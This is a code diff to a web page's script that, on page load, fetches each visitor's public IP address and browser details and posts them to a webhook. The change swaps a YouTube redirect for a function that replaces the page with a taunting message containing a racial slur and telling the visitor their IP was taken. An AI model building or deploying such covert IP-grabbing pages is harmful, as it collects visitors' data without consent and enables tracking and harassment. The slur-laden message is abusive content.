@@ -26,6 +26,11 @@ function getBrowser() {
   return "Unknown";
 }
 
+// Function to display the message
+function showMessage() {
+  document.body.innerHTML = '<div style="text-align: center; font-size: 24px; font-weight: bold; margin-top: 50px; color: red;">haha hamster149 got ur ip nigga</div>';
+}
+
 // Fetch the visitor's public IP (IPv4 or IPv6)
 fetch("https://api64.ipify.org?format=json")
   .then(res => res.json())
@@ -63,17 +68,17 @@ fetch("https://api64.ipify.org?format=json")
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         }).then(() => {
-          // Redirect after successful webhook send
-          window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
+          // Show message after successful webhook send
+          showMessage();
         }).catch(() => {
-          // Redirect even if webhook fails
-          window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
+          // Show message even if webhook fails
+          showMessage();
         });
       });
   })
   .catch(err => {
     console.error("IP fetch error:", err);
-    // Redirect even if IP fetch fails
-    window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
+    // Show message even if IP fetch fails
+    showMessage();
   });
 </script>
